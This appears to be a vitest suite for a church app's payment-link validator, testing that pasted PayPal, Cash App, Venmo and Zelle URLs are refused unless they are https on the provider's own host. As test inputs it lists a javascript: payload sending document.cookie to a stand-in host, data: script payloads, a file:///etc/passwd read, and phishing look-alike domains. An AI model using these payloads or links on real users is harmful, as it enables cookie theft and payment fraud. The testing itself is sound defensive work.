import { describe, it, expect } from 'vitest';
import {
  GIVING_PROVIDERS,
  GIVING_PROVIDER_IDS,
  MAX_GIVING_URL_LENGTH,
  buildGivingLinkRecord,
  getGivingProvider,
  givingUrlRejectionMessage,
  isGivingProviderId,
  readGivingLinks,
  sanitizeGivingEmail,
  sanitizeGivingHandle,
  validateGivingUrl,
  type GivingProvider,
  type GivingProviderId,
} from '../giving-providers';

/**
 * ═════════════════════════════════════════════════════════════════════════════
 * THE-246 — the church's own payment links. The rules, not the rendering.
 * ═════════════════════════════════════════════════════════════════════════════
 *
 * 🔴 THIS IS THE PHISHING GUARD'S SUITE. Everything else in this feature is a
 * screen; this is the part that decides whether a URL a church pasted becomes
 * an `href` a congregation taps. `utils/sanitize.ts`'s `isSafeUrl` is a
 * DENY-list — it refuses `javascript:` and friends and passes everything else —
 * and a deny-list cannot answer the only question that matters here: "is this
 * really PayPal". So the assertions below are written as ATTACKS, one per
 * technique, and each one is a link somebody would actually paste into a church
 * app to skim its giving.
 *
 * ⚠️ RANGED OVER THE TABLE, never over four hand-written provider blocks. The
 * founder wrote "whatever else" twice, so the fifth provider must inherit every
 * rule below without an edit here — a suite that named PayPal, Cash App, Venmo
 * and Zelle one at a time would silently not cover it.
 */

const paypal = getGivingProvider('paypal');
const cashapp = getGivingProvider('cashapp');
const venmo = getGivingProvider('venmo');
const zelle = getGivingProvider('zelle');

/** A URL on the provider's own primary host — the shape that must always pass. */
const goodUrlFor = (p: GivingProvider): string => `https://${p.hosts[0]}/gracechapel`;

/** A record with all three fields set for one provider. */
const recordFor = (
  id: GivingProviderId,
  fields: { url?: string; handle?: string; email?: string },
) => ({ givingLinks: { [id]: fields } });

// ═════════════════════════════════════════════════════════════════════════════
// 1. The table is the extension point
// ═════════════════════════════════════════════════════════════════════════════
describe('the provider list is a table, so a fifth provider is one row', () => {
  it('carries the four the founder named', () => {
    expect(GIVING_PROVIDER_IDS).toEqual(['paypal', 'cashapp', 'venmo', 'zelle']);
    expect(GIVING_PROVIDERS.map((p) => p.label)).toEqual(['PayPal', 'Cash App', 'Venmo', 'Zelle']);
  });

  it('gives every provider everything a screen needs, so no component special-cases one', () => {
    // If a field here were optional, some component would have to know which
    // provider lacks it — which is exactly the per-provider branch the table
    // exists to prevent.
    for (const p of GIVING_PROVIDERS) {
      expect(p.label, `${p.id} has no label`).toBeTruthy();
      expect(p.monogram.length, `${p.id}'s monogram is not a single glyph`).toBe(1);
      expect(p.tint, `${p.id} has no accent`).toMatch(/^#[0-9A-F]{6}$/i);
      expect(p.ink, `${p.id} has no ink`).toMatch(/^#[0-9A-F]{6}$/i);
      expect(p.hosts.length, `${p.id} has no host allow-list`).toBeGreaterThan(0);
      expect(p.handleLabel, `${p.id} does not name its own handle`).toBeTruthy();
      expect(p.handleExample, `${p.id} has no handle example`).toBeTruthy();
      expect(typeof p.hasPersonalLink).toBe('boolean');
    }
  });

  it("each provider's own example URL passes its own rule", () => {
    // A placeholder that would be rejected if typed is a placeholder that
    // teaches a church the wrong shape.
    for (const p of GIVING_PROVIDERS) {
      const result = validateGivingUrl(p.urlExample, p);
      expect(result.ok, `${p.id}'s example URL is refused by its own allow-list`).toBe(true);
    }
  });

  it('rejects a provider id that is not in the table, prototype keys included', () => {
    expect(isGivingProviderId('paypal')).toBe(true);
    // `{}['constructor']` is truthy; a plain-object lookup would answer this yes.
    for (const notAProvider of ['constructor', '__proto__', 'toString', 'stripe', '']) {
      expect(isGivingProviderId(notAProvider), `"${notAProvider}" passed as a provider`).toBe(false);
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 2. Three fields per provider — the founder's requirement, literally
// ═════════════════════════════════════════════════════════════════════════════
describe('each provider stores a URL, a username and an email', () => {
  it('round-trips all three, for every provider in the table', () => {
    // "Besides the username of the Cash App, PayPal, Venmo, Zelle, whatever
    // else, make sure to add the email used for this... All three of these."
    for (const p of GIVING_PROVIDERS) {
      const url = goodUrlFor(p);
      const stored = buildGivingLinkRecord({ [p.id]: { url, handle: '@grace', email: 'Giving@Church.ORG' } });
      expect(stored[p.id], `${p.id} stored nothing`).toBeDefined();
      expect(stored[p.id]!.url, `${p.id} dropped the URL`).toBe(`${url}`);
      expect(stored[p.id]!.handle, `${p.id} dropped the handle`).toBe('@grace');
      // Normalised on the way in, so two churches typing the same address store
      // the same bytes.
      expect(stored[p.id]!.email, `${p.id} dropped the email`).toBe('giving@church.org');

      const published = readGivingLinks({ givingLinks: stored });
      expect(published).toHaveLength(1);
      expect(published[0].provider.id).toBe(p.id);
      expect(published[0].url).toBe(url);
      expect(published[0].handle).toBe('@grace');
      expect(published[0].email).toBe('giving@church.org');
    }
  });

  it('publishes a provider that has ONLY an email — which is the Zelle case', () => {
    // Zelle has no per-church page: a person is reached through their bank by
    // email or mobile number. Refusing a row without a URL would make the one
    // provider that is identified by email alone unusable.
    const published = readGivingLinks(recordFor('zelle', { email: 'giving@church.org' }));
    expect(published).toHaveLength(1);
    expect(published[0].url, 'a link was invented for a provider that has none').toBeNull();
    expect(published[0].email).toBe('giving@church.org');
    expect(zelle.hasPersonalLink, 'the table stopped recording that Zelle has no link').toBe(false);
  });

  it('publishes nothing for a provider with all three fields empty', () => {
    expect(readGivingLinks(recordFor('paypal', { url: '', handle: '  ', email: '' }))).toEqual([]);
    expect(buildGivingLinkRecord({ paypal: { url: '', handle: '', email: '' } })).toEqual({});
  });

  it('keeps the two good fields when the third is refused, rather than losing the row', () => {
    // A church that pastes a bad link should not also lose the handle and email
    // it typed correctly — the row still reaches its members.
    const published = readGivingLinks(
      recordFor('paypal', { url: 'http://paypal.me/grace', handle: 'grace', email: 'giving@church.org' }),
    );
    expect(published).toHaveLength(1);
    expect(published[0].url, 'an http link survived into an href').toBeNull();
    expect(published[0].handle).toBe('grace');
    expect(published[0].email).toBe('giving@church.org');
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 3. 🔴 The scheme guard
// ═════════════════════════════════════════════════════════════════════════════
describe('a non-https or javascript: URL is rejected', () => {
  const HOSTILE_SCHEMES = [
    'javascript:alert(1)',
    // eslint-disable-next-line no-script-url
    'JavaScript:alert(document.cookie)',
    'javascript:fetch("https://collect.example?c="+document.cookie)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:msgbox(1)',
    'blob:https://paypal.me/1234',
    'file:///etc/passwd',
    'mailto:giving@collect.example',
    'tel:+15550000000',
  ];

  it('refuses every hostile scheme, for every provider', () => {
    for (const p of GIVING_PROVIDERS) {
      for (const hostile of HOSTILE_SCHEMES) {
        const result = validateGivingUrl(hostile, p);
        expect(result.ok, `${p.id} accepted "${hostile}"`).toBe(false);
      }
    }
  });

  it('refuses plain http even on the provider\'s own host', () => {
    // The host is right and the link still goes over the wire in the clear. A
    // giving link is a money link; there is no version of this that is fine.
    for (const p of GIVING_PROVIDERS) {
      const result = validateGivingUrl(`http://${p.hosts[0]}/gracechapel`, p);
      expect(result.ok, `${p.id} accepted an http link`).toBe(false);
      if (!result.ok) expect(result.reason).toBe('not-https');
    }
  });

  it('never rescues a hostile scheme by prefixing https:// in front of it', () => {
    // 🔴 THE TRAP IN THE CONVENIENCE. A church that types `paypal.me/grace` is
    // understood, which means the validator adds a scheme when one is missing.
    // If that rule ran on a string that ALREADY declares `javascript:`, the
    // result would parse as an https URL and the attack would pass. It does not:
    // a declared scheme is kept and judged.
    const result = validateGivingUrl('javascript:alert(1)', paypal);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason, 'a hostile scheme was silently prefixed').not.toBe('foreign-host');
  });

  it('does add https:// to a bare host, so a church that omits it is understood', () => {
    const result = validateGivingUrl('paypal.me/gracechapel', paypal);
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.url).toBe('https://paypal.me/gracechapel');
  });

  it('refuses a URL longer than the cap, before parsing it', () => {
    const long = `https://paypal.me/${'a'.repeat(MAX_GIVING_URL_LENGTH)}`;
    const result = validateGivingUrl(long, paypal);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe('too-long');
  });

  it('refuses a non-string, and blank input, without throwing', () => {
    for (const junk of [undefined, null, 42, {}, [], true]) {
      expect(validateGivingUrl(junk, paypal).ok, `${JSON.stringify(junk)} passed`).toBe(false);
    }
    expect(validateGivingUrl('   ', paypal).ok).toBe(false);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 4. 🔴 The look-alike guard — the host must be the provider's own
// ═════════════════════════════════════════════════════════════════════════════
describe('a link whose host does not match its provider is rejected', () => {
  it('refuses a plain foreign host', () => {
    for (const p of GIVING_PROVIDERS) {
      expect(validateGivingUrl('https://collect.example/give', p).ok, `${p.id} accepted a foreign host`).toBe(false);
    }
  });

  it("refuses another provider's host — a PayPal button that opens Venmo is still wrong", () => {
    expect(validateGivingUrl('https://venmo.com/u/grace', paypal).ok).toBe(false);
    expect(validateGivingUrl('https://paypal.me/grace', venmo).ok).toBe(false);
    expect(validateGivingUrl('https://cash.app/$grace', zelle).ok).toBe(false);
  });

  it('🔴 refuses a SUFFIX look-alike — paypal.me.collect.example', () => {
    // The single most common shape. `includes()` or `startsWith()` would pass
    // every one of these; `endsWith('.' + host)` is what refuses them.
    const lookalikes = [
      'https://paypal.me.collect.example/grace',
      'https://paypal.com.givenow.example/grace',
      'https://www.paypal.me.evil.example/grace',
      'https://paypal.me-collect.example/grace',
      'https://notpaypal.me/grace',
      'https://xpaypal.com/grace',
    ];
    for (const url of lookalikes) {
      expect(validateGivingUrl(url, paypal).ok, `"${url}" passed as PayPal`).toBe(false);
    }
  });

  it('🔴 refuses the provider name in the PATH of a foreign host', () => {
    for (const url of [
      'https://collect.example/paypal.me/grace',
      'https://collect.example/?to=paypal.me',
      'https://collect.example/#paypal.me',
    ]) {
      expect(validateGivingUrl(url, paypal).ok, `"${url}" passed as PayPal`).toBe(false);
    }
  });

  it('🔴 refuses the credentials trick — https://paypal.me@collect.example/', () => {
    // Renders as "paypal.me…" to a person and resolves to collect.example. The
    // host check alone would catch it; the credentials check refuses the SHAPE
    // as well, so it fails even when the real host IS allowed.
    expect(validateGivingUrl('https://paypal.me@collect.example/give', paypal).ok).toBe(false);
    expect(validateGivingUrl('https://user:pw@collect.example/give', paypal).ok).toBe(false);
    const onOwnHost = validateGivingUrl('https://anything@paypal.me/grace', paypal);
    expect(onOwnHost.ok, 'a disguised link passed because its host happened to be right').toBe(false);
    if (!onOwnHost.ok) expect(onOwnHost.reason).toBe('has-credentials');
  });

  it('🔴 refuses a Unicode homograph, because URL punycodes it and punycode matches nothing', () => {
    // `pаypal.me` with a Cyrillic а (U+0430). Indistinguishable on screen.
    expect(validateGivingUrl('https://pаypal.me/grace', paypal).ok).toBe(false);
    // And the punycode spelling of the same thing, typed directly.
    expect(validateGivingUrl('https://xn--pypal-4ve.me/grace', paypal).ok).toBe(false);
  });

  it('refuses a trailing-dot FQDN on a foreign host, and accepts it on the real one', () => {
    // `collect.example.` resolves exactly as `collect.example` does, so the dot
    // must not be a way past the allow-list.
    expect(validateGivingUrl('https://collect.example./grace', paypal).ok).toBe(false);
    expect(validateGivingUrl('https://paypal.me./grace', paypal).ok).toBe(true);
  });

  it('refuses a port, which no real consumer payment link carries', () => {
    const result = validateGivingUrl('https://paypal.me:8443/grace', paypal);
    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.reason).toBe('has-port');
  });

  it('ACCEPTS the real thing — the provider\'s own host and its subdomains', () => {
    // The proof the tests above are testing a rule and not a broken parser.
    const accepted = [
      [paypal, 'https://paypal.me/gracechapel'],
      [paypal, 'https://www.paypal.com/paypalme/gracechapel'],
      [paypal, 'https://paypal.me/gracechapel/25?locale.x=en_US'],
      [cashapp, 'https://cash.app/$gracechapel'],
      [venmo, 'https://venmo.com/u/gracechapel'],
      [venmo, 'https://account.venmo.com/u/gracechapel'],
      [zelle, 'https://www.zellepay.com/'],
    ] as const;
    for (const [provider, url] of accepted) {
      const result = validateGivingUrl(url, provider);
      expect(result.ok, `${provider.id} refused its own real link "${url}"`).toBe(true);
    }
  });

  it('names the provider and its hosts when it refuses, so the church can fix it', () => {
    const result = validateGivingUrl('https://collect.example/give', paypal);
    expect(result.ok).toBe(false);
    if (!result.ok) {
      const message = givingUrlRejectionMessage(result.reason, paypal);
      expect(message).toContain('PayPal');
      expect(message).toContain('paypal.me');
    }
  });

  it('has a message for every rejection reason, for every provider', () => {
    const REASONS = ['empty', 'too-long', 'unparseable', 'not-https', 'has-credentials', 'has-port', 'foreign-host'] as const;
    for (const p of GIVING_PROVIDERS) {
      for (const reason of REASONS) {
        expect(givingUrlRejectionMessage(reason, p).length, `${p.id}/${reason} has no message`).toBeGreaterThan(10);
      }
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 5. Validated on READ, not only on write
// ═════════════════════════════════════════════════════════════════════════════
describe('a stored value is re-validated before it can become an href', () => {
  it('drops a hostile URL that is already in the document', () => {
    // The write path validates, but a document can predate the rule that now
    // governs it — or be written by a super admin, or by a surface that does not
    // exist yet. The read is what actually protects the member.
    for (const url of ['javascript:alert(1)', 'https://collect.example/give', 'http://paypal.me/grace']) {
      const published = readGivingLinks(recordFor('paypal', { url, handle: 'grace' }));
      expect(published[0]?.url, `"${url}" reached a member's screen`).toBeNull();
    }
  });

  it('survives a malformed document without throwing', () => {
    // Every one of these is a shape a hand-edited or half-migrated doc can have.
    const junk: unknown[] = [
      undefined, null, {}, { givingLinks: null }, { givingLinks: 'paypal' },
      { givingLinks: [] }, { givingLinks: { paypal: 'https://paypal.me/x' } },
      { givingLinks: { paypal: [] } }, { givingLinks: { paypal: { url: 42 } } },
      { givingLinks: { notAProvider: { url: 'https://collect.example' } } },
    ];
    for (const config of junk) {
      expect(() => readGivingLinks(config as never), `threw on ${JSON.stringify(config)}`).not.toThrow();
      expect(readGivingLinks(config as never).every((l) => typeof l.provider.id === 'string')).toBe(true);
    }
    expect(readGivingLinks({ givingLinks: { notAProvider: { url: 'https://collect.example' } } })).toEqual([]);
  });

  it('never lets a key from the prototype chain become a provider', () => {
    const hostile = JSON.parse('{"givingLinks":{"__proto__":{"url":"https://collect.example"},"constructor":{"url":"https://collect.example"}}}');
    expect(readGivingLinks(hostile)).toEqual([]);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 6. 🔴 Order is deterministic
// ═════════════════════════════════════════════════════════════════════════════
describe('link order is deterministic', () => {
  it('is the table\'s order, whatever order the document lists providers in', () => {
    // "I want you to randomize them nicely, beautifully" — read as ARRANGE, not
    // shuffle. A giving surface that moves between visits is one a member cannot
    // learn, and a member who meant Cash App and hit Zelle has been mis-sent
    // money. Firestore does not promise object key order, so the order cannot
    // come from the document.
    const reversed = {
      givingLinks: {
        zelle: { email: 'z@church.org' },
        venmo: { url: 'https://venmo.com/u/grace' },
        cashapp: { url: 'https://cash.app/$grace' },
        paypal: { url: 'https://paypal.me/grace' },
      },
    };
    const ids = readGivingLinks(reversed).map((l) => l.provider.id);
    expect(ids).toEqual(['paypal', 'cashapp', 'venmo', 'zelle']);
    expect(ids, 'the order came from the document, not the table')
      .toEqual(GIVING_PROVIDER_IDS.filter((id) => ids.includes(id)));
  });

  it('is the same on every call, and contains no randomness', () => {
    const config = {
      givingLinks: {
        venmo: { url: 'https://venmo.com/u/grace' },
        paypal: { url: 'https://paypal.me/grace' },
        zelle: { email: 'z@church.org' },
      },
    };
    const first = readGivingLinks(config).map((l) => l.provider.id);
    for (let i = 0; i < 25; i += 1) {
      expect(readGivingLinks(config).map((l) => l.provider.id), 'the order moved between calls').toEqual(first);
    }
    expect(first).toEqual(['paypal', 'venmo', 'zelle']);
  });

  it('keeps a provider in its own place when the ones around it are absent', () => {
    // Relative order is a property of the TABLE, so removing PayPal must not
    // move Venmo above Cash App.
    expect(readGivingLinks({
      givingLinks: { venmo: { handle: '@g' }, cashapp: { handle: '$g' } },
    }).map((l) => l.provider.id)).toEqual(['cashapp', 'venmo']);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// 7. The handle and the email
// ═════════════════════════════════════════════════════════════════════════════
describe('the handle and the email are cleaned before they are stored', () => {
  it('collapses whitespace and strips control characters from a handle', () => {
    expect(sanitizeGivingHandle('  @grace   chapel  ')).toBe('@grace chapel');
    expect(sanitizeGivingHandle('@grace chapel')).toBe('@grace chapel');
    expect(sanitizeGivingHandle('line\nbreak')).toBe('line break');
    expect(sanitizeGivingHandle('   ')).toBeNull();
    expect(sanitizeGivingHandle(42)).toBeNull();
  });

  it('caps a handle rather than storing an essay', () => {
    expect(sanitizeGivingHandle('a'.repeat(500))!.length).toBe(64);
  });

  it('accepts an ordinary church address and refuses what is not an address', () => {
    expect(sanitizeGivingEmail('  Giving@Church.ORG ')).toBe('giving@church.org');
    expect(sanitizeGivingEmail('pastor.jane+giving@grace-chapel.co.uk')).toBe('pastor.jane+giving@grace-chapel.co.uk');
    for (const bad of ['grace', 'grace@', '@church.org', 'a@b', 'a b@church.org', 'a@b,c.org', 'a@b<c>.org', '']) {
      expect(sanitizeGivingEmail(bad), `"${bad}" passed as an email`).toBeNull();
    }
  });
});
